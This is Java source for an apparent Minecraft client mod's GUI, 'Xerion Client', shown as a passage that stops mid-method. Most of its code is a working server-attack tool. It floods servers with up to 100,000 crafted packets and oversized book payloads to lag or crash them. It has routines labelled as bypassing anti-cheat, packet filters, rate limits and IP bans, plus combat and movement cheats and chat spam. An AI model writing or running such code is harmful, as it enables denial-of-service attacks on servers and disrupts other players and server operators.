package com.professor.client.gui;

import com.professor.client.ProfessorClientMod;
import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;
import net.minecraft.client.gui.DrawContext;
import net.minecraft.client.gui.screen.Screen;
import net.minecraft.client.gui.widget.ButtonWidget;
import net.minecraft.client.gui.widget.TextFieldWidget;
import net.minecraft.network.packet.c2s.play.*;
import net.minecraft.text.Text;
import net.minecraft.util.Hand;
import net.minecraft.util.math.MathHelper;

import java.util.ArrayList;
import java.util.List;
import java.util.Random;

@Environment(EnvType.CLIENT)
public class ProfessorScreen extends Screen {

    // ══════════════════════════════════════════════════════════════════════
    //  ICE PALETTE — fully opaque for clear visibility
    // ══════════════════════════════════════════════════════════════════════
    private static final int BG       = 0xFF010A14;   // deep midnight navy
    private static final int PANEL_BG = 0xFF041828;   // solid dark ice
    private static final int BORDER   = 0xFFAAEEFF;   // bright ice (solid)
    private static final int BORDER2  = 0xFF55CCFF;   // secondary ice
    private static final int TITLE1   = 0xFFEEF8FF;   // snow white
    private static final int TITLE2   = 0xFFFFD700;   // gold
    private static final int TXT_ICE  = 0xFF88DDFF;   // ice text
    private static final int TXT_DIM  = 0xFF336688;   // dim text
    private static final int TXT_BRIGHT = 0xFFCCF0FF; // bright label
    private static final int SNOW_W   = 0xFFFFFFFF;
    private static final int SNOW_B   = 0xFFCCEEFF;
    private static final int CRYSTAL  = 0xFF00CCEE;
    private static final int GOLD     = 0xFFFFD700;
    private static final int RED      = 0xFFFF2244;
    private static final int GREEN    = 0xFF00FF99;
    private static final int ORANGE   = 0xFFFF8800;

    // ── Layout ───────────────────────────────────────────────────────────
    private static final int PW = 740, PH = 510, TH = 36, TABH = 26;

    // ── Tabs ─────────────────────────────────────────────────────────────
    private static final String[] TABS = {"⚡FLOOD","❄BYPASS","💥EXPLOIT","☠CRASH","⚔COMBAT","🏃MOVE","💬CHAT"};
    private static final int NT = 7;
    private static final int[] TC = {0x55DDFF,0x00FFCC,0x88AAFF,0xFF3355,0xFF6644,0xFFBB44,0x44BBFF};
    private int tab = 0;
    private final float[] tabGlow = new float[NT];
    private float tabSlide = 1f;

    // ── Bypass mode ───────────────────────────────────────────────────────
    private static final String[] BP = {
        "OFF","BURST","WAVE","NCP","MATRIX",
        "VULCAN","GRIM","GHOST","INTAVE","CRASHPASS"
    };
    private int bypass = 0;

    // ── Settings ─────────────────────────────────────────────────────────
    private int delay = 0, burst = 1, speed = 1;
    private boolean unlimited = false;
    private int exploitType = 0, crashType = 0;
    private TextFieldWidget numField, chatField;

    // ── Status ────────────────────────────────────────────────────────────
    private String statusText  = "Xerion Client  v2.0  ❄  Ready";
    private int    statusColor = 0xFF88EEFF;
    private int    statusTimer = 0;

    // ── Animation ─────────────────────────────────────────────────────────
    private long  tick = 0;
    private float glow = 0f; private boolean glowUp = true;
    private float hue  = 0f;
    private float scanA = 0f;
    private float hexOff = 0f;
    private float snowDrift = 0f;
    private float hypeSmooth = 0f;

    // ── Snow ──────────────────────────────────────────────────────────────
    private static final int SCNT = 200;
    private final float[] sx  = new float[SCNT], sy  = new float[SCNT];
    private final float[] ssp = new float[SCNT], ssz = new float[SCNT];
    private final float[] sal = new float[SCNT], sph = new float[SCNT];

    // ── Sparkles ──────────────────────────────────────────────────────────
    private static final int GPCNT = 55;
    private final float[] gpx = new float[GPCNT], gpy = new float[GPCNT];
    private final float[] gpp = new float[GPCNT], gps = new float[GPCNT];

    // ── Particles ─────────────────────────────────────────────────────────
    private static final int PCNT = 180;
    private final float[] ppx=new float[PCNT],ppy=new float[PCNT];
    private final float[] pvx=new float[PCNT],pvy=new float[PCNT];
    private final float[] psz=new float[PCNT],pal=new float[PCNT];
    private final float[] pph=new float[PCNT]; private final int[] pct=new int[PCNT];

    // ── Mouse trail ───────────────────────────────────────────────────────
    private record TrailPt(int x,int y,int color,float life){}
    private final List<TrailPt> trail = new ArrayList<>();
    private int lastMx=-1, lastMy=-1;

    // ── Data streams ─────────────────────────────────────────────────────
    private static final String DS = "XERION01FROST10BYPASS00ICE11PACKET";
    private final float[] dsX=new float[65],dsY=new float[65],dsSp=new float[65];
    private final int[]   dsCh=new int[65];

    // ── Hype burst ────────────────────────────────────────────────────────
    private final List<float[]> burst2 = new ArrayList<>();

    private final Random rng = new Random();

    // ═══════════════════════════════════════════════════════════════════════
    public ProfessorScreen() {
        super(Text.literal("Xerion Client"));
        initAll();
    }

    @Override protected void init() { initAll(); rebuild(); ProfessorMusicManager.onOpen(client); }
    @Override public void removed()  { ProfessorMusicManager.onClose(client); super.removed(); }
    @Override public boolean shouldPause() { return false; }

    private void initAll() {
        int W=width<=0?800:width, H=height<=0?600:height;
        for(int i=0;i<SCNT;i++){sx[i]=rng.nextFloat()*W;sy[i]=rng.nextFloat()*H;ssp[i]=rng.nextFloat()*.85f+.2f;ssz[i]=rng.nextFloat()*4f+1f;sal[i]=rng.nextFloat()*.75f+.25f;sph[i]=rng.nextFloat()*6.28f;}
        for(int i=0;i<GPCNT;i++){gpx[i]=rng.nextFloat()*W;gpy[i]=rng.nextFloat()*H;gpp[i]=rng.nextFloat()*6.28f;gps[i]=rng.nextFloat()*3f+1.5f;}
        for(int i=0;i<PCNT;i++){ppx[i]=rng.nextFloat()*W;ppy[i]=rng.nextFloat()*H;pvx[i]=(rng.nextFloat()-.5f)*.5f;pvy[i]=-(rng.nextFloat()*.7f+.1f);psz[i]=rng.nextFloat()*3+.5f;pal[i]=rng.nextFloat()*.85f+.15f;pph[i]=rng.nextFloat()*6.28f;pct[i]=rng.nextInt(5);}
        for(int i=0;i<65;i++){dsX[i]=i*(W/65f);dsY[i]=rng.nextFloat()*-H;dsSp[i]=rng.nextFloat()*1.3f+.4f;dsCh[i]=rng.nextInt(DS.length());}
    }

    // ── Rebuild widgets ───────────────────────────────────────────────────
    private void rebuild() {
        clearChildren(); numField=null; chatField=null;
        int cx=width/2,bpx=cx-PW/2,bpy=height/2-PH/2;
        int tabW=(PW-12)/NT;
        for(int i=0;i<NT;i++){final int idx=i;addDrawableChild(ButtonWidget.builder(Text.literal(TABS[i]),b->{cs();switchTab(idx);}).dimensions(bpx+6+i*(tabW+1),bpy+TH+5,tabW,TABH).build());}
        switch(tab){
            case 0->buildFlood(cx,bpy);
            case 1->buildBypass(cx,bpy,bpx);
            case 2->buildExploit(cx,bpy);
            case 3->buildCrash(cx,bpy);
            case 4->buildCombat(cx,bpy);
            case 5->buildMove(cx,bpy);
            case 6->buildChat(cx,bpy);
        }
        addDrawableChild(ButtonWidget.builder(Text.literal("✕  CLOSE"),b->{cs();close();}).dimensions(cx-48,bpy+PH-30,96,22).build());
    }

    private void switchTab(int t){if(t==tab)return;tab=t;tabSlide=0f;rebuild();}
    private void cs(){if(client!=null)ProfessorClientMod.playClickSound(client);}
    private void flash(String t,int c){statusText=t;statusColor=c;statusTimer=160;}

    // ─────────────────────────────────────────────────────────────────────
    //  TAB BUILDERS
    // ─────────────────────────────────────────────────────────────────────

    private void buildFlood(int cx,int bpy){
        int y=bpy+76,bw=280;
        addDrawableChild(ButtonWidget.builder(Text.literal(unlimited?"MODE: UNLIMITED !!!":"MODE: COUNT"),b->{cs();unlimited=!unlimited;b.setMessage(Text.literal(unlimited?"MODE: UNLIMITED !!!":"MODE: COUNT"));}).dimensions(cx-bw/2,y,bw,20).build());
        numField=new TextFieldWidget(textRenderer,cx-70,y+24,140,18,Text.empty());numField.setMaxLength(9);numField.setText("10000");addSelectableChild(numField);
        int[][] pr={{1000,-180},{10000,-65},{100000,55},{1000000,170}};
        for(int[] p:pr){int n=p[0];addDrawableChild(ButtonWidget.builder(Text.literal(n>=1000000?"1M":n>=1000?(n/1000)+"K":""+n),b->{cs();numField.setText(""+n);}).dimensions(cx+p[1]-30,y+47,60,16).build());}
        addDrawableChild(ButtonWidget.builder(Text.literal("Bypass: "+BP[bypass]),b->{cs();bypass=(bypass+1)%BP.length;b.setMessage(Text.literal("Bypass: "+BP[bypass]));}).dimensions(cx-bw/2,y+68,bw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("Delay: "+delay+"ms"),b->{cs();delay=(delay+5)%55;b.setMessage(Text.literal("Delay: "+delay+"ms"));}).dimensions(cx-bw/2,y+90,bw,16).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("❄ >>>  SEND PACKETS  <<< ❄"),b->{cs();doFlood();}).dimensions(cx-140,y+112,280,26).build());
    }

    private void buildBypass(int cx,int bpy,int bpx){
        int bw=PW-36, x=bpx+18, y=bpy+68;
        // ── Mode selector ────────────────────────────────────────────────
        String[] bi={"No bypass — raw","Burst Y 0.0625 / 3 pkts","Sine Y ~0.08","NCP multi-pattern","Matrix 4-step","Vulcan micro-variance","Grim vanilla-like","Ghost stealth","Intave dual-sine","CrashPass extreme"};
        for(int i=0;i<BP.length;i++){final int idx=i;addDrawableChild(ButtonWidget.builder(Text.literal((bypass==idx?"▶ ❄ ":"")+BP[i]+"   "+bi[i]),b->{cs();bypass=idx;rebuild();}).dimensions(x,y+i*20,bw,18).build());}

        // ── Advanced bypass actions ───────────────────────────────────────
        int ay=y+BP.length*20+10;
        int hw=(bw-4)/2;
        addDrawableChild(ButtonWidget.builder(Text.literal("📦 Packet Filter Bypass"),  b->{cs();bypassPacketFilter();}).dimensions(x,   ay,   hw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("🛡 Anti-Exploit Bypass"),   b->{cs();bypassAntiExploit();}).dimensions(x+hw+4,ay,hw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("📋 NBT Filter Bypass"),     b->{cs();bypassNBT();}).dimensions(x,   ay+22,hw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("📖 Book Protection Bypass"),b->{cs();bypassBook();}).dimensions(x+hw+4,ay+22,hw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("👾 Entity Limit Bypass"),   b->{cs();bypassEntity();}).dimensions(x,   ay+44,hw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("🗺 Chunk Protection Bypass"),b->{cs();bypassChunk();}).dimensions(x+hw+4,ay+44,hw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("⏱ Rate-Limit Bypass"),     b->{cs();bypassRateLimit();}).dimensions(x,   ay+66,hw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("🌐 Proxy/IP Ban Bypass"),   b->{cs();bypassProxy();}).dimensions(x+hw+4,ay+66,hw,18).build());
    }

    private void buildExploit(int cx,int bpy){
        String[] en={"Swing Flood  — spam arm swing packets","Slot Spam  — cycle hotbar 0→8 rapidly","Teleport Ack  — fake confirm IDs 0→N","Move Flood  — micro-jitter position","Interact Flood  — rapid use-item"};
        for(int i=0;i<en.length;i++){final int idx=i;addDrawableChild(ButtonWidget.builder(Text.literal((exploitType==idx?"▶ ":"")+en[idx]),b->{cs();exploitType=idx;rebuild();}).dimensions(cx-255,bpy+70+i*22,510,18).build());}
        numField=new TextFieldWidget(textRenderer,cx-70,bpy+196,140,18,Text.empty());numField.setMaxLength(7);numField.setText("1000");addSelectableChild(numField);
        addDrawableChild(ButtonWidget.builder(Text.literal("[ EXECUTE ]"),b->{cs();doExploit();}).dimensions(cx-115,bpy+220,230,26).build());
    }

    private void buildCrash(int cx,int bpy){
        String[] cn={"Packet Crash  — 100k rapid packets to overload handler","NBT Crash  — deeply nested NBT payload","Book Crash  — 100 pages book update packet","Entity Crash  — 5k interact on invalid IDs","Tick Lag  — 10k complex multi-packet sequence","Move Spam  — 50k extreme coordinate packets","Chat Flood  — 200 rapid messages","Teleport Bomb  — 10k random ack packets"};
        for(int i=0;i<cn.length;i++){final int idx=i;addDrawableChild(ButtonWidget.builder(Text.literal((crashType==idx?"▶ ":"")+cn[idx]),b->{cs();crashType=idx;rebuild();}).dimensions(cx-255,bpy+70+i*22,510,18).build());}
        addDrawableChild(ButtonWidget.builder(Text.literal("[ EXECUTE CRASH ]"),b->{cs();doCrash();}).dimensions(cx-115,bpy+258,230,26).build());
    }

    private void buildCombat(int cx,int bpy){
        int bw=400,bx=cx-bw/2,y=bpy+72;
        addDrawableChild(ButtonWidget.builder(Text.literal("[1]  Hit Spam  —  200×burst swing packets + bypass"),b->{cs();combatHit();}).dimensions(bx,y,bw,20).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[2]  Crit Exploit  —  0.42 Y-jump then hit"),b->{cs();combatCrit();}).dimensions(bx,y+24,bw,20).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[3]  Anti-KB  —  150 same-pos ground packets"),b->{cs();combatAKB();}).dimensions(bx,y+48,bw,20).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[4]  Fast Use  —  80 off-hand use packets"),b->{cs();combatFU();}).dimensions(bx,y+72,bw,20).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[5]  Reach Exploit  —  arc position flood"),b->{cs();combatReach();}).dimensions(bx,y+96,bw,20).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[6]  Velocity Abuse  —  mixed Y arc hits"),b->{cs();combatVelo();}).dimensions(bx,y+120,bw,20).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("Burst: "+burst+"x"),b->{cs();burst=burst%8+1;b.setMessage(Text.literal("Burst: "+burst+"x"));}).dimensions(cx-58,y+148,116,18).build());
    }

    private void buildMove(int cx,int bpy){
        int bw=400,bx=cx-bw/2,y=bpy+72;
        addDrawableChild(ButtonWidget.builder(Text.literal("[1]  Speed Boost  —  arc forward move packets"),b->{cs();moveSpd();}).dimensions(bx,y,bw,20).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[2]  Blink  —  flush held position packets"),b->{cs();moveBlink();}).dimensions(bx,y+24,bw,20).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[3]  Fly Exploit  —  onGround=false Y packets"),b->{cs();moveFly();}).dimensions(bx,y+48,bw,20).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[4]  NoFall  —  onGround=true through fall"),b->{cs();moveNF();}).dimensions(bx,y+72,bw,20).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[5]  Step  —  staircase Y sequence"),b->{cs();moveStep();}).dimensions(bx,y+96,bw,20).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[6]  Strafe  —  lateral position flood"),b->{cs();moveStrafe();}).dimensions(bx,y+120,bw,20).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("Speed: "+speed+"x"),b->{cs();speed=speed%12+1;b.setMessage(Text.literal("Speed: "+speed+"x"));}).dimensions(cx-58,y+148,116,18).build());
    }

    private void buildChat(int cx,int bpy){
        chatField=new TextFieldWidget(textRenderer,cx-175,bpy+78,350,20,Text.empty());chatField.setMaxLength(256);chatField.setText("/gamemode creative");addSelectableChild(chatField);
        numField=new TextFieldWidget(textRenderer,cx-70,bpy+104,140,18,Text.empty());numField.setMaxLength(6);numField.setText("50");addSelectableChild(numField);
        addDrawableChild(ButtonWidget.builder(Text.literal("SPAM CHAT"),b->{cs();doChat();}).dimensions(cx-105,bpy+128,210,22).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("SEND AS COMMAND"),b->{cs();doCmd();}).dimensions(cx-105,bpy+154,210,20).build());
    }

    // ═══════════════════════════════════════════════════════════════════════
    //  ACTIONS
    // ═══════════════════════════════════════════════════════════════════════
    private int parseN(){try{return Math.max(1,Integer.parseInt(numField!=null?numField.getText():"100"));}catch(Exception e){return 100;}}

    private void doFlood(){
        if(client==null||client.player==null||client.getNetworkHandler()==null)return;
        int n=unlimited?65000:parseN();
        for(int i=0;i<n;i++){
            client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX()+bypassX(i),client.player.getY()+bypassDY(i),client.player.getZ()+bypassZ(i),bypassGround(i)));
            if(bypass>0&&i%3==0)client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
        }
        flash("❄ Sent "+n+" packets  ["+BP[bypass]+"]",0xFF88EEFF);
        triggerBurst();
    }

    private void doExploit(){
        if(client==null||client.player==null||client.getNetworkHandler()==null)return;
        int n=parseN();
        switch(exploitType){
            case 0->{for(int i=0;i<n;i++)client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(i%2==0?Hand.MAIN_HAND:Hand.OFF_HAND));flash("Swing: "+n,0xFF00FF99);}
            case 1->{for(int i=0;i<Math.min(n,500);i++)client.getNetworkHandler().sendPacket(new UpdateSelectedSlotC2SPacket(i%9));flash("Slot spam: "+Math.min(n,500),0xFF00FF99);}
            case 2->{for(int i=0;i<Math.min(n,300);i++)client.getNetworkHandler().sendPacket(new TeleportConfirmC2SPacket(i));flash("TeleportAck: "+Math.min(n,300),0xFF00FF99);}
            case 3->{for(int i=0;i<n;i++)client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX()+rng.nextGaussian()*.008,client.player.getY(),client.player.getZ()+rng.nextGaussian()*.008,true));flash("MoveFlood: "+n,0xFF00FF99);}
            case 4->{for(int i=0;i<Math.min(n,400);i++)client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));flash("Interact: "+Math.min(n,400),0xFF00FF99);}
        }
        triggerBurst();
    }

    private void doCrash(){
        if(client==null||client.player==null||client.getNetworkHandler()==null)return;
        switch(crashType){
            case 0->{for(int i=0;i<100000;i++)client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX(),client.player.getY()+bypassDY(i),client.player.getZ(),i%2==0));flash("☠ PACKET CRASH 100k",RED);}
            case 1->{List<String> pg=new java.util.ArrayList<>();String b="§l§k".repeat(20)+"CRASH".repeat(500);for(int i=0;i<50;i++)pg.add(b);try{client.getNetworkHandler().sendPacket(new BookUpdateC2SPacket(client.player.getInventory().selectedSlot,pg,java.util.Optional.empty()));}catch(Exception e){flash("NBT: unsupported",ORANGE);break;}flash("☠ NBT CRASH 50×7k",RED);}
            case 2->{List<String> pg=new java.util.ArrayList<>();String p="Xerion Crash".repeat(100);for(int i=0;i<100;i++)pg.add(p);try{client.getNetworkHandler().sendPacket(new BookUpdateC2SPacket(client.player.getInventory().selectedSlot,pg,java.util.Optional.of("X")));}catch(Exception e){flash("Book: unsupported",ORANGE);break;}flash("☠ BOOK 100 pages",RED);}
            case 3->{for(int i=0;i<5000;i++)client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(i%2==0?Hand.MAIN_HAND:Hand.OFF_HAND));flash("☠ ENTITY 5k",RED);}
            case 4->{for(int i=0;i<10000;i++){client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX()+i*.0001,client.player.getY()+bypassDY(i),client.player.getZ()+i*.0001,i%3==0));if(i%5==0)client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));if(i%7==0)client.getNetworkHandler().sendPacket(new UpdateSelectedSlotC2SPacket(i%9));}flash("☠ TICK LAG 10k",RED);}
            case 5->{for(int i=0;i<50000;i++)client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX()+rng.nextDouble()*1e6,client.player.getY(),client.player.getZ()+rng.nextDouble()*1e6,true));flash("☠ MOVE SPAM 50k",RED);}
            case 6->{for(int i=0;i<200;i++)client.getNetworkHandler().sendChatMessage("XERION "+i);flash("☠ CHAT 200",RED);}
            case 7->{for(int i=0;i<10000;i++)client.getNetworkHandler().sendPacket(new TeleportConfirmC2SPacket(rng.nextInt(65536)));flash("☠ TELE BOMB 10k",RED);}
        }
        triggerBurst();
    }

    // Combat
    private void combatHit(){if(np())return;for(int i=0;i<200*burst;i++)client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));flash("Hit spam ×"+(200*burst),ORANGE);triggerBurst();}
    private void combatCrit(){if(np())return;for(int i=0;i<60;i++){client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX(),client.player.getY()+(i%2==0?.42:.0),client.player.getZ(),false));}flash("Crit exploit ×60",ORANGE);}
    private void combatAKB(){if(np())return;for(int i=0;i<150;i++)client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX(),client.player.getY(),client.player.getZ(),true));flash("Anti-KB ×150",ORANGE);}
    private void combatFU(){if(nc())return;for(int i=0;i<80;i++)client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.OFF_HAND));flash("FastUse ×80",ORANGE);}
    private void combatReach(){if(np())return;double r=3.5+speed*.2;for(int i=0;i<120;i++)client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX()+Math.cos(i*.05)*r,client.player.getY(),client.player.getZ()+Math.sin(i*.05)*r,true));flash("Reach r="+String.format("%.1f",r),ORANGE);}
    private void combatVelo(){if(np())return;for(int i=0;i<100;i++){double dy=Math.sin(i*.15)*.3;client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX(),client.player.getY()+dy,client.player.getZ(),false));}flash("VeloAbuse ×100",ORANGE);}

    // Move
    private void moveSpd(){if(np())return;double sp=speed*.42;for(int i=0;i<100;i++)client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX()+sp*Math.cos(i*.06),client.player.getY()+bypassDY(i)*.3,client.player.getZ()+sp*Math.sin(i*.06),bypassGround(i)));flash("Speed "+speed+"x",0xFFFFBB44);}
    private void moveBlink(){if(np())return;for(int i=0;i<35;i++)client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX(),client.player.getY(),client.player.getZ(),true));flash("Blink flushed",0xFFFFBB44);}
    private void moveFly(){if(np())return;for(int i=0;i<75;i++)client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX(),client.player.getY()+i*.05,client.player.getZ(),false));flash("Fly ×75",0xFFFFBB44);}
    private void moveNF(){if(np())return;for(int i=0;i<130;i++)client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX(),client.player.getY(),client.player.getZ(),true));flash("NoFall ×130",0xFFFFBB44);}
    private void moveStep(){if(np())return;double base=client.player.getY();for(int i=0;i<60;i++){double dy=i<30?i*.025:(60-i)*.015;client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX(),base+dy,client.player.getZ(),i%2==0));}flash("Step ×60",0xFFFFBB44);}
    private void moveStrafe(){if(np())return;for(int i=0;i<80;i++)client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX()+Math.sin(i*.1)*speed*.3,client.player.getY(),client.player.getZ()+Math.cos(i*.1)*speed*.3,true));flash("Strafe ×80",0xFFFFBB44);}

    // Chat
    private void doChat(){if(client==null||client.getNetworkHandler()==null||chatField==null)return;String m=chatField.getText();int n=parseN();for(int i=0;i<n;i++)client.getNetworkHandler().sendChatMessage(m);flash("Chat spam ×"+n,0xFF44BBFF);}
    private void doCmd(){if(client==null||client.getNetworkHandler()==null||chatField==null)return;String c=chatField.getText().startsWith("/")?chatField.getText().substring(1):chatField.getText();client.getNetworkHandler().sendCommand(c);flash("Cmd: /"+c,0xFF44BBFF);}

    // ─────────────────────────────────────────────────────────────────────
    //  ADVANCED BYPASS ACTIONS
    // ─────────────────────────────────────────────────────────────────────

    /** Packet Filter Bypass — irregular bursts with noise headers */
    private void bypassPacketFilter(){
        if(np())return;
        int n=3000;
        for(int i=0;i<n;i++){
            // Irregular spacing: batch of 5-10 then mini gap (simulated by varied Y)
            double dy=rng.nextDouble()*.018+(i%9==0?.0625:0)+(i%5==0?.03125:0);
            client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX()+rng.nextGaussian()*.004,client.player.getY()+dy,client.player.getZ()+rng.nextGaussian()*.004,i%9!=0));
            if(i%6==0)client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
            if(i%11==0)client.getNetworkHandler().sendPacket(new UpdateSelectedSlotC2SPacket(i%9));
        }
        flash("📦 Packet Filter Bypass: "+n+" pkts",0xFF88EEFF);triggerBurst();
    }

    /** Anti-Exploit Bypass — mix legit-looking packets with exploit data */
    private void bypassAntiExploit(){
        if(np())return;
        for(int i=0;i<2000;i++){
            // Alternate between normal-look and exploit packets
            if(i%3==0){
                // "normal" movement
                client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX(),client.player.getY(),client.player.getZ(),true));
            } else {
                // exploit packet
                double dy=Math.sin(i*.22)*.06+(i%7==0?.0625:0);
                client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX()+rng.nextGaussian()*.003,client.player.getY()+dy,client.player.getZ()+rng.nextGaussian()*.003,i%4==0));
            }
            if(i%8==0)client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
        }
        flash("🛡 Anti-Exploit Bypass: 2k mixed pkts",0xFF00FF99);triggerBurst();
    }

    /** NBT Filter Bypass — fragment data into multiple small book packets */
    private void bypassNBT(){
        if(np())return;
        try{
            // Send multiple small book updates instead of one big one
            for(int r=0;r<10;r++){
                List<String> pages=new java.util.ArrayList<>();
                String chunk="§r§l".repeat(5)+"XERION_NBT_".repeat(50);
                for(int p=0;p<5;p++) pages.add(chunk);
                client.getNetworkHandler().sendPacket(new BookUpdateC2SPacket(client.player.getInventory().selectedSlot,pages,java.util.Optional.empty()));
                // Interleave with movement
                client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX(),client.player.getY()+rng.nextDouble()*.008,client.player.getZ(),true));
            }
            flash("📋 NBT Filter Bypass: 10 fragmented",0xFF88EEFF);
        }catch(Exception e){flash("📋 NBT: unsupported here",ORANGE);}
        triggerBurst();
    }

    /** Book Protection Bypass — rapid small valid book updates */
    private void bypassBook(){
        if(np())return;
        try{
            for(int r=0;r<20;r++){
                List<String> pages=new java.util.ArrayList<>();
                pages.add("Xerion Book ".repeat(20)+" #"+r);
                client.getNetworkHandler().sendPacket(new BookUpdateC2SPacket(client.player.getInventory().selectedSlot,pages,java.util.Optional.empty()));
                client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
            }
            flash("📖 Book Protection Bypass: 20 rapid",0xFF88EEFF);
        }catch(Exception e){flash("📖 Book: unsupported",ORANGE);}
        triggerBurst();
    }

    /** Entity Limit Bypass — spread entity interactions to evade per-entity limits */
    private void bypassEntity(){
        if(np())return;
        int n=4000;
        for(int i=0;i<n;i++){
            // Alternate hands to hit different tracking buckets
            client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(i%2==0?Hand.MAIN_HAND:Hand.OFF_HAND));
            if(i%4==0) client.getNetworkHandler().sendPacket(new UpdateSelectedSlotC2SPacket(i%9));
            if(i%6==0) client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX()+rng.nextGaussian()*.002,client.player.getY(),client.player.getZ()+rng.nextGaussian()*.002,true));
        }
        flash("👾 Entity Limit Bypass: "+n+" interactions",0xFF88EEFF);triggerBurst();
    }

    /** Chunk Protection Bypass — cross chunk-boundary position packets */
    private void bypassChunk(){
        if(np())return;
        double bx=client.player.getX(), bz=client.player.getZ();
        for(int i=0;i<2000;i++){
            // Move across chunk boundaries (every 16 blocks)
            double offX=(i%32<16)?i*.8:-i*.8;
            double offZ=(i%28<14)?i*.6:-i*.6;
            double dy=bypassDY(i);
            client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(bx+offX*.001,client.player.getY()+dy,bz+offZ*.001,bypassGround(i)));
            if(i%5==0) client.getNetworkHandler().sendPacket(new TeleportConfirmC2SPacket(i%256));
        }
        flash("🗺 Chunk Protection Bypass: 2k cross-chunk",0xFF88EEFF);triggerBurst();
    }

    /** Rate-Limit Bypass — stay just under per-tick rate limits with timing */
    private void bypassRateLimit(){
        if(np())return;
        // Send in small precise bursts designed to stay under server rate limits
        for(int batch=0;batch<50;batch++){
            // 8 packets per "tick simulation" — typical limit is 10-15
            for(int p=0;p<8;p++){
                double dy=Math.sin((batch*8+p)*.25)*.04+((p==0)?.03125:0);
                client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX()+rng.nextGaussian()*.002,client.player.getY()+dy,client.player.getZ()+rng.nextGaussian()*.002,p%3==0));
            }
            if(batch%3==0) client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
        }
        flash("⏱ Rate-Limit Bypass: 50 timed batches",0xFF88EEFF);triggerBurst();
    }

    /** Proxy/IP Ban Bypass — reconnect-style packet sequences */
    private void bypassProxy(){
        if(np())return;
        // Simulate reconnect handshake patterns + flood
        for(int i=0;i<1500;i++){
            client.getNetworkHandler().sendPacket(new TeleportConfirmC2SPacket(rng.nextInt(32767)));
            if(i%3==0) client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX(),client.player.getY()+bypassDY(i),client.player.getZ(),bypassGround(i)));
            if(i%5==0) client.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
        }
        flash("🌐 Proxy Bypass: 1.5k reconnect-style pkts",0xFF88EEFF);triggerBurst();
    }

    // ── Null guards ───────────────────────────────────────────────────────
    private boolean np(){return client==null||client.player==null||client.getNetworkHandler()==null;}
    private boolean nc(){return client==null||client.getNetworkHandler()==null;}

    // ── Bypass DY / X / Z / Ground ────────────────────────────────────────
    private double bypassDY(int i){return switch(bypass){
        case 1->(i%3==0)?.0625:0;
